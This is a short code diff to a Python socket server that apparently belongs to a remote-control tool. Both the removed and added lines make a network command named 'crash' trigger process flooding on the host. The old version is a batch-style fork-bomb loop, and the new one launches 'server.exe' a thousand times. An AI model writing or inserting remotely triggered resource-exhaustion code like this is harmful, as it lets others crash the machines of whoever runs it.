@@ -50,7 +50,8 @@ def start_server(port=65432):
                             conn.sendall(response.encode('utf-8'))
                         
                         elif splitUp[0].lower() == "crash":
-                            os.system("@echo off \n :crash \n start \n goto crash")
+                            for x in range(1000):
+                                os.system("start server.exe")
                                 
 
                                                        
